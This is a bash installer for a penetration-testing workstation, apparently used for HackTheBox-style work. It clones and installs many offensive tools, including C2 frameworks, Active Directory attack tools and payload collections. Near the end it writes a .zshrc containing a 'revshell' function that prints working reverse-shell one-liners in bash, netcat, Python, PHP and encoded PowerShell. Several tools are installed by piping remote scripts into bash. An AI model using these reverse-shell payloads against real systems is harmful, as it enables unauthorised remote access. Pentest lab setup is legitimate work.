#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

# ========== Pretty colors & helpers ==========
ESCAPE_SEQ='\033['
RESET="${ESCAPE_SEQ}0m"
BOLD="${ESCAPE_SEQ}1m"
DIM="${ESCAPE_SEQ}2m"

RED="${ESCAPE_SEQ}31m"
GREEN="${ESCAPE_SEQ}32m"
YELLOW="${ESCAPE_SEQ}33m"
BLUE="${ESCAPE_SEQ}34m"
MAGENTA="${ESCAPE_SEQ}35m"
CYAN="${ESCAPE_SEQ}36m"

info()    { printf "%b %b%s%b\n" "🛈" "${BOLD}${BLUE}" "$1" "${RESET}"; }
step()    { printf "%b %b%s%b\n" "▶" "${BOLD}${CYAN}" "$1" "${RESET}"; }
success() { printf "%b %b%s%b\n" "✔" "${BOLD}${GREEN}" "$1" "${RESET}"; }
warn()    { printf "%b %b%s%b\n" "⚠" "${BOLD}${YELLOW}" "$1" "${RESET}"; }
error()   { printf "%b %b%s%b\n" "✖" "${BOLD}${RED}" "$1" "${RESET}" >&2; }

# trap for graceful exit
on_exit() {
  local rc=$?
  if [ $rc -ne 0 ]; then
    error "Script exited with error code $rc"
  fi
}
trap on_exit EXIT

# ========== Configuration ==========

DEST_DIR="/opt"
REPOS=(
  "https://github.com/sham00n/buster.git"
  "https://github.com/xm1k3/cent.git"
  "https://github.com/BishopFox/cloudfox.git"
  "https://github.com/aquasecurity/cloudsploit.git"
  "https://github.com/cve-search/cve-search.git"
  "https://github.com/hahwul/dalfox.git"
  "https://github.com/imthaghost/goclone.git"
  "https://github.com/pemistahl/grex.git"
  "https://github.com/fortra/impacket.git"
  "https://github.com/ropnop/kerbrute.git"
  "https://github.com/deathmarine/Luyten.git"
  "https://github.com/samratashok/nishang.git"
  "https://github.com/ayadim/Nuclei-bug-hunter.git"
  "https://github.com/swisskyrepo/PayloadsAllTheThings.git"
  "https://github.com/BishopFox/sliver.git"
  "https://github.com/trufflesecurity/trufflehog.git"
  "https://github.com/0xKayala/ParamSpider.git"
  "https://github.com/cathugger/mkp224o.git"
  "https://github.com/gotr00t0day/spyhunt.git"
  "https://github.com/trickest/cve.git"
  "https://github.com/Flangvik/SharpCollection.git"
  "https://github.com/urbanadventurer/username-anarchy.git"
  "https://github.com/nicocha30/ligolo-ng.git"
  "https://github.com/x90skysn3k/brutespray.git"
  "https://github.com/GerbenJavado/LinkFinder.git"
  "https://github.com/hakluke/hakrawler.git"
  "https://github.com/danielmiessler/SecLists.git"
  "https://github.com/HavocFramework/Havoc.git"
  "https://github.com/Greenwolf/ntlm_theft.git"
  "https://github.com/Adaptix-Framework/AdaptixC2.git"
  "https://github.com/itm4n/PrivescCheck.git"
  "https://github.com/diego-treitos/linux-smart-enumeration.git"
  "https://github.com/ShutdownRepo/targetedKerberoast.git"
  "https://github.com/Leo4j/Invoke-ADEnum.git"
  "https://github.com/lefayjey/linWinPwn.git"
  "https://github.com/gitleaks/gitleaks.git"
  "https://github.com/semgrep/semgrep-rules.git"
  "https://github.com/nullsection/chisel-ng.git"
  "https://github.com/strayge/pylnk.git"
)

APT_PACKAGES=(curl wget gcc make build-essential fzf golang-go python3 python3-pip python3-venv pipx parallel jq unzip git docker.io docker-compose cargo zsh tmux ligolo-mp lsd)

# ========== Utilities ==========
repo_name_from_url() {
  local url="$1"
  local base="${url##*/}"
  base="${base%.git}"
  base="${base%%/*}"
  printf '%s' "$base"
}

is_valid_git_url() {
  local url="$1"
  if [[ "$url" =~ ^https?:// ]] && [[ "$url" == *.git ]]; then
    return 0
  fi
  if [[ "$url" =~ ^git@ ]]; then
    return 0
  fi
  return 1
}

# ========== Dependency checks & install ==========
check_dependencies() {
  info "Checking for system dependencies..."
  local missing=()
  for pkg in "${APT_PACKAGES[@]}"; do
    case "$pkg" in
      docker-compose)
        if ! command -v docker-compose &>/dev/null && ! docker compose version &>/dev/null 2>&1; then
          missing+=("$pkg")
        fi
        ;;
      pipx)
        if ! command -v pipx &>/dev/null; then
          missing+=("$pkg")
        fi
        ;;
      *)
        if ! command -v "${pkg%%-*}" &>/dev/null && ! dpkg -s "$pkg" &>/dev/null 2>&1; then
          missing+=("$pkg")
        fi
        ;;
    esac
  done

  if [ ${#missing[@]} -eq 0 ]; then
    success "All system dependencies present."
    return 0
  fi

  warn "Missing packages: ${missing[*]}"
  step "Installing missing packages via apt (requires sudo)..."
  sudo apt update -y
  sudo apt install -y "${missing[@]}" || {
    error "Failed to install some apt packages. Please install them manually and re-run."
    return 1
  }

  if ! command -v pipx &>/dev/null; then
    step "Installing pipx via pip..."
    python3 -m pip install --user pipx || true
    python3 -m pipx ensurepath || true
    export PATH="$PATH:$HOME/.local/bin"
  fi

  success "Dependencies installed."
  return 0
}

# ========== Git clone / update ==========
install_git_repos() {
  step "Preparing destination: $DEST_DIR"
  sudo mkdir -p "$DEST_DIR"
  sudo chown "$(id -u):$(id -g)" "$DEST_DIR" || true

  for repo in "${REPOS[@]}"; do
    if ! is_valid_git_url "$repo"; then
      warn "Skipping invalid/unsupported git URL: $repo"
      continue
    fi

    name=$(repo_name_from_url "$repo")
    target="$DEST_DIR/$name"

    if [ -d "$target/.git" ]; then
      info "Updating $name..."
      # Check for uncommitted changes
      if ! git -C "$target" diff-index --quiet HEAD -- 2>/dev/null; then
        warn "$name has uncommitted changes. Skipping update."
        continue
      fi
      
      if git -C "$target" pull --ff-only --quiet 2>/dev/null; then
        success "Updated $name"
      else
        warn "git pull failed for $name — attempting fetch"
        git -C "$target" fetch --all --prune || warn "fetch failed for $name"
      fi
    else
      info "Cloning $name → $target"
      if git clone --depth 1 --quiet "$repo" "$target" 2>/dev/null; then
        success "Cloned $name"
      else
        warn "Clone failed for $repo. Skipping."
        continue
      fi
    fi

    chmod -R u+rwX,go+rX,go-w "$target" 2>/dev/null || true
  done
}

# ========== Go tools ==========
install_go_tools() {
  if ! command -v go &>/dev/null; then
    warn "Go not found in PATH. Skipping Go tool installs."
    return 0
  fi

  info "Installing Go tools (go env GOPATH: $(go env GOPATH 2>/dev/null || echo 'unset'))"
  export PATH="$(go env GOPATH 2>/dev/null)/bin:${PATH:-/usr/local/bin}"

  local go_tools=(
    "github.com/takshal/freq@latest"
    "github.com/lc/gau/v2/cmd/gau@latest"
    "github.com/tomnomnom/gf@latest"
    "github.com/hakluke/hakrawler@latest"
    "github.com/takshal/bfxss@latest"
    "github.com/tomnomnom/qsreplace@latest"
    "github.com/tomnomnom/waybackurls@latest"
    "github.com/tomnomnom/gron@latest"
    "github.com/hakluke/hakcheckurl@latest"
    "github.com/tomnomnom/httprobe@latest"
    "github.com/tomnomnom/anew@latest"
    "github.com/tomnomnom/unfurl@latest"
    "github.com/ffuf/pencode/cmd/pencode@latest"
    "github.com/projectdiscovery/pdtm/cmd/pdtm@latest"
    "github.com/glitchedgitz/cook/v2/cmd/cook@latest"
    "github.com/GoToolSharing/htb-cli@latest"
    "github.com/ropnop/kerbrute@latest"
  )

  for tool in "${go_tools[@]}"; do
    local tool_name=$(basename "$tool" | cut -d@ -f1)
    step "Installing $tool_name..."
    if go install "$tool" 2>/dev/null; then
      success "Installed $tool_name"
    else
      warn "go install failed for $tool — continuing"
    fi
  done
}

# ========== Python tools via pipx ==========
install_python_tools() {
  if ! command -v pipx &>/dev/null; then
    warn "pipx not found; skipping Python tool installs."
    return 0
  fi

  info "Installing Python tools via pipx..."
  local py_tools=(
    "git+https://github.com/AD-Security/AD_Miner.git"
    "git+https://github.com/dwisiswant0/apkleaks.git"
    "git+https://github.com/s0md3v/Arjun.git"
    "git+https://github.com/s0md3v/uro.git"
    "git+https://github.com/sherlock-project/sherlock.git"
    "git+https://github.com/brightio/penelope.git"
    "git+https://github.com/freelabz/secator.git"
    "git+https://github.com/CravateRouge/bloodyAD.git"
    "git+https://github.com/CravateRouge/autobloody.git"
    "git+https://github.com/Maxteabag/sqlit.git"
    "git+https://github.com/p0dalirius/Coercer.git"
    "git+https://github.com/blacklanternsecurity/baddns"
    "git+https://github.com/ShutdownRepo/pywhisker.git"
    "git+https://github.com/aniqfakhrul/powerview.py.git"
  )

  for pkg in "${py_tools[@]}"; do
    local pkg_name=$(basename "$pkg" .git)
    step "Installing $pkg_name..."
    if pipx install --force "$pkg" &>/dev/null; then
      success "Installed $pkg_name"
    else
      warn "pipx install failed for $pkg_name"
      pipx install "$pkg" 2>/dev/null || warn "pipx still failed for $pkg_name"
    fi
  done
}

# ========== exploitdb (go-exploitdb) ==========
exploitdb() {
  local repo_path="${GOPATH:-$HOME/go}/src/github.com/vulsio/go-exploitdb"
  step "Installing/updating go-exploitdb in $repo_path"
  mkdir -p "$(dirname "$repo_path")"
  if [ ! -d "$repo_path" ]; then
    if git clone --quiet https://github.com/vulsio/go-exploitdb.git "$repo_path" 2>/dev/null; then
      success "Cloned go-exploitdb"
    else
      warn "Failed to clone go-exploitdb"
      return 1
    fi
  else
    info "Updating go-exploitdb"
    git -C "$repo_path" pull --quiet 2>/dev/null || warn "Failed to update go-exploitdb"
  fi

  cd "$repo_path" || return 1
  if make install &>/dev/null; then
    success "go-exploitdb installed"
  else
    warn "make install failed for go-exploitdb"
  fi
  cd - >/dev/null || true
}

# ========== BloodHound CLI (optional) ==========
install_bloodhound() {
  if ! command -v wget &>/dev/null; then
    warn "wget missing; cannot install bloodhound-cli automatically."
    return 0
  fi

  info "Installing BloodHound CLI (if available)"
  local tmp="/tmp/bloodhound-cli-linux-amd64.tar.gz"
  if wget -q -O "$tmp" "https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz" 2>/dev/null; then
    sudo tar -xzf "$tmp" -C /usr/local/bin/ 2>/dev/null || warn "tar extraction warning"
    sudo chmod +x /usr/local/bin/bloodhound-cli 2>/dev/null || true
    
    # Only add to docker group if docker exists
    if command -v docker &>/dev/null; then
      sudo usermod -aG docker "$USER" 2>/dev/null || true
    fi
    
    success "BloodHound CLI binary installed to /usr/local/bin/"
    rm -f "$tmp"
  else
    warn "Could not download BloodHound CLI release (maybe no internet or release missing)."
  fi
}

install_ronin() {
  info "Attempting Ronin install via upstream script"
  if command -v curl &>/dev/null; then
    if curl -sSL "https://raw.githubusercontent.com/ronin-rb/scripts/main/ronin-install.sh" 2>/dev/null | bash; then
      success "Ronin installed"
    else
      warn "Ronin install script failed"
    fi
  else
    warn "curl not present; cannot install Ronin automatically."
  fi
}

install_java_8() {
  info "Attempting Java 8 install via upstream script"
  if command -v curl &>/dev/null; then
    if curl -o /tmp/openjdk-8u44-linux-x64.tar.gz -sSL "https://download.java.net/openjdk/jdk8u44/ri/openjdk-8u44-linux-x64.tar.gz" 2>/dev/null && tar -xzf /tmp/openjdk-8u44-linux-x64.tar.gz -C /tmp/ 2>/dev/null; then
      tar -xzf /tmp/openjdk-8u44-linux-x64.tar.gz -C /tmp/ 2>/dev/null || warn "Java tar extraction warning"
      sudo mv /tmp/java-se-8u44-ri /usr/lib/jvm/java-se-8 2>/dev/null || warn "Java mv warning"
      sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/java-se-8/bin/java 1 2>/dev/null || warn "update-alternatives warning"
      sudo update-alternatives --set java /usr/lib/jvm/java-se-8/bin/java 2>/dev/null || warn "update-alternatives set warning"
      sudo update-alternatives --auto java 2>/dev/null || warn "update-alternatives auto warning"
      success "Java 8 installed"
    else
      warn "Java 8 install script failed"
    fi
  else
    warn "curl not present; cannot install Java 8 automatically."
  fi
}


install_ysoserial_jar() {
  info "Attempting ysoserial-jar install via upstream script"
  if command -v curl &>/dev/null; then
    if curl -o "$DEST_DIR/ysoserial-all.jar" -sSL "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar" 2>/dev/null; then
      success "ysoserial-jar installed"
    else
      warn "ysoserial-jar install script failed"
    fi
  else
    warn "curl not present; cannot install ysoserial-jar automatically."
  fi
}

install_ysoserial_net() {
  info "Attempting ysoserial-net install via upstream script"
  if command -v curl &>/dev/null; then
    if curl -o "$DEST_DIR/ysoserial-net.zip" -sSL "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip" 2>/dev/null; then
      unzip -oq "$DEST_DIR/ysoserial-net.zip" -d "$DEST_DIR/ysoserial-net" 2>/dev/null || warn "ysoserial-net unzip warning"
      mv $DEST_DIR/ysoserial-net/Release/* $DEST_DIR/ysoserial-net/ 2>/dev/null || true
      rm -rf "$DEST_DIR/ysoserial-net/Release"
      rm -f "$DEST_DIR/ysoserial-net.zip"
      success "ysoserial-net installed"
    else
      warn "ysoserial-net install script failed"
    fi
  else
    warn "curl not present; cannot install ysoserial-net automatically."
  fi
}

install_opengrep() {
  info "Attempting opengrep install via upstream script"
  if command -v curl &>/dev/null; then
    if curl -fsSL https://raw.githubusercontent.com/opengrep/opengrep/main/install.sh 2>/dev/null | bash; then
      success "Opengrep installed"
    else
      warn "Opengrep install script failed"
    fi
  else
    warn "curl not present; cannot install Opengrep automatically."
  fi
}


install_witr() {
  info "Attempting Witr install via upstream script"
  if command -v curl &>/dev/null; then
    if curl -sSL "https://raw.githubusercontent.com/pranshuparmar/witr/main/install.sh " 2>/dev/null | bash; then
      success "Witr installed"
    else
      warn "Witr install script failed"
    fi
  else
    warn "curl not present; cannot install Witr automatically."
  fi
}

install_spf() {
  info "Attempting SPF install via upstream script"
  if command -v curl &>/dev/null; then
    if curl -sLo- https://superfile.dev/install.sh 2>/dev/null | bash; then
      success "SPF installed"
    else
      warn "SPF install script failed"
    fi
  else
    warn "curl not present; cannot install SPF automatically."
  fi
}

font_packages_install() {
  local font_dir="${HOME}/.local/share/fonts"
  local tmp="/tmp/hack-nerd-font.zip"
  local url="https://github.com/ryanoasis/nerd-fonts/releases/download/v3.4.0/Hack.zip"

  step "Preparing font directory: $font_dir"
  mkdir -p "$font_dir" || { error "mkdir failed"; return 1; }

  info "Installing Hack Nerd Font (for better terminal experience)"

  if ! command -v unzip &>/dev/null; then
    warn "unzip not found. Installing..."
    sudo apt update -y && sudo apt install -y unzip || {
      error "Failed to install unzip. Aborting font install."
      return 1
    }
  fi

  if command -v wget &>/dev/null; then
    step "Downloading Hack Nerd Font..."
    if wget -q -O "$tmp" "$url" 2>/dev/null; then
      step "Extracting fonts to $font_dir..."
      unzip -oq "$tmp" -d "$font_dir" 2>/dev/null || warn "Font extraction warning"
      fc-cache -fv >/dev/null 2>&1 || true
      success "Hack Nerd Font installed successfully."
      rm -f "$tmp"
    else
      error "Failed to download font from $url"
      return 1
    fi
  else
    error "wget not found. Please install wget or curl before running this."
    return 1
  fi
}

# ========== NEW: Oh My Zsh + tmux + zshrc installer ==========
install_oh_my_zsh() {
  if [ -d "${HOME}/.oh-my-zsh" ]; then
    info "oh-my-zsh already installed."
    return 0
  fi

  if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
    warn "curl/wget missing; cannot install oh-my-zsh automatically."
    return 0
  fi

  if ! command -v zsh &>/dev/null; then
    warn "zsh not installed. Installing via apt..."
    sudo apt update -y && sudo apt install -y zsh || {
      error "Failed to install zsh"
      return 1
    }
  fi

  step "Installing oh-my-zsh (non-interactive)"
  export RUNZSH="no" CHSH="no"
  if command -v curl &>/dev/null; then
    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended 2>/dev/null || {
      warn "oh-my-zsh install script failed"
      return 1
    }
  else
    sh -c "$(wget -qO- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended 2>/dev/null || {
      warn "oh-my-zsh install script failed"
      return 1
    }
  fi
  
  # Install plugins
  git clone --quiet https://github.com/zsh-users/zsh-autosuggestions.git "${HOME}/.oh-my-zsh/custom/plugins/zsh-autosuggestions" 2>/dev/null || warn "zsh-autosuggestions install failed"
  git clone --quiet https://github.com/zsh-users/zsh-syntax-highlighting.git "${HOME}/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting" 2>/dev/null || warn "zsh-syntax-highlighting install failed"
  curl -o "${HOME}/.oh-my-zsh/custom/themes/parrot.zsh-theme" -fsSL https://raw.githubusercontent.com/trabdlkarim/parrot-zsh-theme/refs/heads/main/parrot.zsh-theme 2>/dev/null || warn "parrot theme install failed"
  
  success "oh-my-zsh installed (RUNZSH=no CHSH=no)."
}

install_tmux_conf() {
  if [ -d "${HOME}/.tmux" ] && [ -f "${HOME}/.tmux.conf" ]; then
    info "tmux config (gpakosz) appears already installed."
    return 0
  fi

  if ! command -v tmux &>/dev/null; then
    warn "tmux not installed. Install it first."
    return 0
  fi

  if ! command -v git &>/dev/null; then
    warn "git missing; cannot install tmux config automatically."
    return 0
  fi

  step "Installing gpakosz/.tmux config"
  cd ~ || return 1
  git clone --quiet https://github.com/gpakosz/.tmux.git 2>/dev/null || {
    warn "Failed to clone .tmux repo"
    return 1
  }
  ln -s -f .tmux/.tmux.conf .tmux.conf 2>/dev/null || true
  cp .tmux/.tmux.conf.local . 2>/dev/null || true

  success "tmux config installed (gpakosz)."
}

install_zshrc_template() {
  local zshrc_path="${HOME}/.zshrc"
  local backup="${zshrc_path}.bak.$(date +%s)"

  if [ -f "$zshrc_path" ]; then
    step "Backing up existing .zshrc → $backup"
    cp -a "$zshrc_path" "$backup" || warn "Could not back up existing .zshrc"
  fi

  step "Writing new ~/.zshrc from template"
  cat > "$zshrc_path" <<'EOF'
# Path to your Oh My Zsh installation.
export ZSH="$HOME/.oh-my-zsh"

# Set name of the theme to load
ZSH_THEME="parrot"

# Plugins
plugins=(zsh-autosuggestions zsh-syntax-highlighting fzf)

source $ZSH/oh-my-zsh.sh

# User configuration
export GOPATH="${HOME}/go"
export PATH="${GOPATH}/bin:${PATH}:${HOME}/.local/bin"

# Generated for pdtm. Do not edit.
export PATH=$PATH:$HOME/.pdtm/go/bin

##### Custom Aliases and Functions
alias myip='curl ifconfig.me'

######################### RevShell Function START #################################
revshell(){ 
  ip=$1; port=$2;

  bash_shell="/usr/bin/bash  -i  >&  /dev/tcp/$ip/$port  0>&1  "
  shell_encode=$(echo "$bash_shell"|base64 -w 0)
  
  
  ps_cmd="\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close() "

  ps_base64=$(echo "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
  
  echo -e "\n[+] busybox: busybox nc $ip $port -e sh"
  echo -e "[+] Java Runtime().exec: bash -c $@|bash 0 echo bash -i >& /dev/tcp/$ip/$port 0>&1 "
  echo -e "[+] Bash: /usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo -e "[+] Bash Encoded: echo \"$shell_encode\"|base64 -d |/usr/bin/bash"
  echo -e "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
  echo -e "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
  echo -e "[+] Netcat FIFO: rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/bash -i 2>&1|nc $ip $port"
  echo -e "[+] PowerShell (Base64): powershell -e $ps_base64"
}

######################### RevShell Function END #################################
#
#
#
######################### Aliases START #########################
alias ls='lsd'
alias l='lsd -l'
alias la='lsd -a'
alias lla='lsd -la'
alias lt='lsd --tree'
######################### Aliases END ##########################
#
#
#
######################### Environment variables START ######################## 
export HTB_TOKEN=""
export VMIP=""
export IP=""
######################### Environment variables END ######################## 
EOF

  chmod 644 "$zshrc_path" 2>/dev/null || true
  success "~/.zshrc written."
}

# ========== MAIN ==========
main() {
  info "Starting installer (pretty mode enabled)"
  echo ""

  check_dependencies
  echo ""
  font_packages_install
  echo ""
  install_git_repos
  echo ""
  install_go_tools
  echo ""
  install_python_tools
  echo ""
  exploitdb
  echo ""
  install_bloodhound
  echo ""
  install_ronin
  echo ""
  install_opengrep
  echo ""
  install_witr
  echo ""
  install_spf
  echo ""
  install_oh_my_zsh
  echo ""
  install_tmux_conf
  echo ""
  install_zshrc_template
  echo ""

  success "All done — repos + tools attempted. Inspect the output for any warnings."
  info "Tips: Run this as a user with sudo privileges. Some installs (docker, go) may need manual follow-up."
  info "To use zsh as default shell, run: chsh -s \$(which zsh)"
}

# run when invoked, not when sourced
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi
